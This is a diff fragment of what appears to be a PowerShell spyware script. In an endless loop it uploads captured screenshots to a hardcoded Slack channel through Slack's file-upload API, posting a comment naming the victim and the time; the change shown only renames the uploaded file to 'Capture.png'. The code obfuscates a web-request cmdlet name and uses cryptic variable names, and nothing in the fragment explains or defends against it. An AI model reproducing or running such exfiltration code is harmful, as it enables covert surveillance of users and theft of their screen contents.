@@ -44,7 +44,7 @@ while(1){
           "",
           $pt1,
           "--$bd",
-          "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
+          "Content-Disposition: form-data; name=`"file`"; filename=`"Capture.png`"",
           "Content-Type: application/octet-stream",
           "",
           [System.Text.Encoding]::UTF8.GetString($fb),
@@ -68,7 +68,7 @@ while(1){
           i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
           $scu = "https://slack.com/api/files.completeUploadExternal"
           $scb = @{
-              "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
+              "files" = @(@{ "id" = $luur.file_id; "title" = "Capture.png" })
               "channel_id" = "C08F8RJ84P5"
               "initial_comment"  = "`*Screenshot Captured For $cc At $tml`*"
           } | ConvertTo-Json -Compress
